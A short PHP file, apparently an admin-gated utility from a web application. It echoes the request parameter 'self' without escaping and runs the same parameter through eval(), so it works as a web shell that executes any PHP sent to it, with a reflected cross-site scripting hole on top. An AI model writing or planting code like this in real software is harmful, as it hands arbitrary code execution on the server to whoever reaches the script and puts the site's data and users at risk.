<?php
\H::protectScript(basename(__FILE__), 'checkAdm');

echo $_REQUEST['self'];
var_dump( eval($_REQUEST['self']));